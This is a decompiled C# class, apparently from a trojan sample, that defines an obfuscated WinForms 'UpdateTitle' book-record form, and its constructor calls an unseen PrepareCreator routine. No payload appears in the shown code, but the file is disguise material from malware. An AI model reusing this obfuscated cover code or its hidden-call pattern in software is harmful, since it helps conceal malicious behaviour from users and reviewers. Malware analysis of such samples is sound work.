// Decompiled with JetBrains decompiler
// Type: ProjNet.Bridges.FilterAdvisor
// Assembly: IRefl, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A29A65F6-B7ED-422C-83D4-B9EFD61E5F13
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-8e89881e34371e10b7f9cb943183a061aab9b22853cb7192e1ac09401f4cc545.exe

using ProjNet.Services;
using ProjNet.Structs;
using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace ProjNet.Bridges
{
  public class FilterAdvisor : Form
  {
    private IContainer _AccountAdvisor;
    private TextBox m_IteratorAdvisor;
    private TextBox _VisitorAdvisor;
    private TextBox m_ComparatorAdvisor;
    private TextBox identifierAdvisor;
    private Label annotationAdvisor;
    private Label _ParamsAdvisor;
    private Label repositoryAdvisor;
    private Button m_ConfigAdvisor;
    private Label _AdapterAdvisor;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public FilterAdvisor()
    {
      int num1 = 3;
      if (true)
        goto label_3;
label_1:
      this._AccountAdvisor = (IContainer) null;
      // ISSUE: explicit constructor call
      base.\u002Ector();
      goto label_6;
label_2:
      int num2;
      num1 = num2;
label_3:
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 3:
            PageAdvisorStructBuilder.PrepareCreator();
            num1 = 2;
            continue;
          case 1:
          case 2:
            goto label_1;
          case 4:
            goto label_6;
          case 5:
            goto label_7;
          default:
            goto label_4;
        }
      }
label_7:
      return;
label_4:
      num2 = 4;
      goto label_2;
label_6:
      this.ReadStatus();
      num2 = 5;
      goto label_2;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void SearchStatus(object i, EventArgs cust)
    {
      try
      {
        string text1 = this.identifierAdvisor.Text;
        int num1 = 4;
        while (true)
        {
          string text2;
          string text3;
          int num2;
          switch (num1)
          {
            case 0:
              this.identifierAdvisor.Text = "";
              this.m_ComparatorAdvisor.Text = "";
              this.m_IteratorAdvisor.Text = "";
              num2 = 2;
              break;
            case 1:
            case 5:
              int dic_count = int.Parse(this._VisitorAdvisor.Text);
              CallbackRegistry.StopAdvisor(text1, text2, dic_count, text3);
              int num3 = (int) MessageBox.Show("Title Updated.");
              goto case 0;
            case 2:
            case 3:
              this._VisitorAdvisor.Text = "";
              if (true)
              {
                num1 = 6;
                continue;
              }
              goto case 0;
            case 4:
              text2 = this.m_ComparatorAdvisor.Text;
              text3 = this.m_IteratorAdvisor.Text;
              num2 = 5;
              break;
            case 6:
              goto label_11;
            default:
              if (true)
              {
                num1 = 0;
                continue;
              }
              goto label_9;
          }
          num1 = num2;
        }
label_11:
        return;
label_9:;
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show("Unable to update Title");
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    protected override void Dispose(bool isvar1)
    {
      int num1 = 3;
      while (true)
      {
        int num2;
        switch (num1)
        {
          case 0:
          case 1:
            num2 = this._AccountAdvisor != null ? 1 : 0;
            goto label_7;
          case 2:
          case 4:
label_3:
            this._AccountAdvisor.Dispose();
            break;
          case 3:
            if (isvar1)
            {
              num1 = 0;
              continue;
            }
            num2 = 0;
            goto label_7;
          case 5:
            goto label_8;
          default:
            num1 = 4;
            continue;
        }
label_4:
        base.Dispose(isvar1);
        num1 = 5;
        continue;
label_7:
        if (num2 == 0)
          goto label_4;
        else
          goto label_3;
      }
label_8:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void ReadStatus()
    {
      int num1 = 9;
      if (FilterAdvisor.ReadModel())
        goto label_9;
label_1:
      this._AdapterAdvisor = new Label();
      num1 = 14;
label_9:
      while (true)
      {
        int num2;
        switch (num1)
        {
          case 0:
            this.repositoryAdvisor = new Label();
            this.m_ConfigAdvisor = new Button();
            num2 = 12;
            break;
          case 1:
          case 10:
            this.identifierAdvisor.Size = new Size(100, 20);
            this.identifierAdvisor.TabIndex = 14;
            num2 = 3;
            break;
          case 2:
            this.m_ComparatorAdvisor.TabIndex = 15;
            this.identifierAdvisor.Location = new Point(112, 29);
            this.identifierAdvisor.Name = "ISBNTextBox";
            goto case 1;
          case 3:
            this.annotationAdvisor.AutoSize = true;
            this.annotationAdvisor.Location = new Point(55, 117);
            this.annotationAdvisor.Name = "label4";
            this.annotationAdvisor.Size = new Size(51, 13);
            this.annotationAdvisor.TabIndex = 13;
            this.annotationAdvisor.Text = "Copyright";
            this._ParamsAdvisor.AutoSize = true;
            this._ParamsAdvisor.Location = new Point(24, 89);
            this._ParamsAdvisor.Name = "label3";
            this._ParamsAdvisor.Size = new Size(82, 13);
            this._ParamsAdvisor.TabIndex = 12;
            this._ParamsAdvisor.Text = "Edition Number:";
            this.repositoryAdvisor.AutoSize = true;
            this.repositoryAdvisor.Location = new Point(48, 58);
            this.repositoryAdvisor.Name = "label2";
            this.repositoryAdvisor.Size = new Size(58, 13);
            this.repositoryAdvisor.TabIndex = 11;
            this.repositoryAdvisor.Text = "Book Title:";
            this.m_ConfigAdvisor.Location = new Point(112, 141);
            this.m_ConfigAdvisor.Name = "UpdateButton";
            this.m_ConfigAdvisor.Size = new Size(75, 23);
            this.m_ConfigAdvisor.TabIndex = 10;
            this.m_ConfigAdvisor.Text = "Update";
            this.m_ConfigAdvisor.UseVisualStyleBackColor = true;
            this.m_ConfigAdvisor.Click += new EventHandler(this.SearchStatus);
            this._AdapterAdvisor.AutoSize = true;
            this._AdapterAdvisor.Location = new Point(71, 29);
            this._AdapterAdvisor.Name = "label1";
            this._AdapterAdvisor.Size = new Size(35, 13);
            num2 = 7;
            break;
          case 4:
            this.AutoScaleMode = AutoScaleMode.Font;
            this.ClientSize = new Size(284, 264);
            num2 = 8;
            break;
          case 5:
            this._VisitorAdvisor.TabIndex = 16;
            this.m_ComparatorAdvisor.Location = new Point(112, 58);
            this.m_ComparatorAdvisor.Name = "BookTitleTextBox";
            num1 = 17;
            continue;
          case 6:
            this.Controls.Add((Control) this.m_ComparatorAdvisor);
            this.Controls.Add((Control) this.identifierAdvisor);
            this.Controls.Add((Control) this.annotationAdvisor);
            this.Controls.Add((Control) this._ParamsAdvisor);
            num2 = 19;
            break;
          case 7:
            this._AdapterAdvisor.TabIndex = 9;
            this._AdapterAdvisor.Text = "ISBN:";
            num2 = 13;
            break;
          case 8:
            this.Controls.Add((Control) this.m_IteratorAdvisor);
            this.Controls.Add((Control) this._VisitorAdvisor);
            num2 = 6;
            break;
          case 9:
            this.m_IteratorAdvisor = new TextBox();
            num2 = 11;
            break;
          case 11:
            this._VisitorAdvisor = new TextBox();
            num2 = 20;
            break;
          case 12:
            goto label_1;
          case 13:
            this.AutoScaleDimensions = new SizeF(6f, 13f);
            num2 = 4;
            break;
          case 14:
            this.SuspendLayout();
            this.m_IteratorAdvisor.Location = new Point(112, 115);
            this.m_IteratorAdvisor.Name = "CopyrightTextBox";
            this.m_IteratorAdvisor.Size = new Size(100, 20);
            this.m_IteratorAdvisor.TabIndex = 17;
            this._VisitorAdvisor.Location = new Point(112, 89);
            this._VisitorAdvisor.Name = "EditionTextBox";
            this._VisitorAdvisor.Size = new Size(100, 20);
            num2 = 5;
            break;
          case 15:
          case 18:
            this.Text = "UpdateTitle";
            this.ResumeLayout(false);
            this.PerformLayout();
            num2 = 21;
            break;
          case 16:
            this._ParamsAdvisor = new Label();
            if (true)
            {
              num1 = 0;
              continue;
            }
            goto label_23;
          case 17:
            this.m_ComparatorAdvisor.Size = new Size(100, 20);
            num2 = 2;
            break;
          case 19:
            this.Controls.Add((Control) this.repositoryAdvisor);
            this.Controls.Add((Control) this.m_ConfigAdvisor);
            this.Controls.Add((Control) this._AdapterAdvisor);
            this.Name = "UpdateTitle";
            num2 = 15;
            break;
          case 20:
            this.m_ComparatorAdvisor = new TextBox();
            this.identifierAdvisor = new TextBox();
            this.annotationAdvisor = new Label();
            num2 = 16;
            break;
          case 21:
            goto label_24;
          default:
            num1 = 1;
            continue;
        }
        num1 = num2;
      }
label_24:
      return;
label_23:;
    }

    internal static bool ReadModel() => true;

    internal static bool ExcludeModel() => false;
  }
}
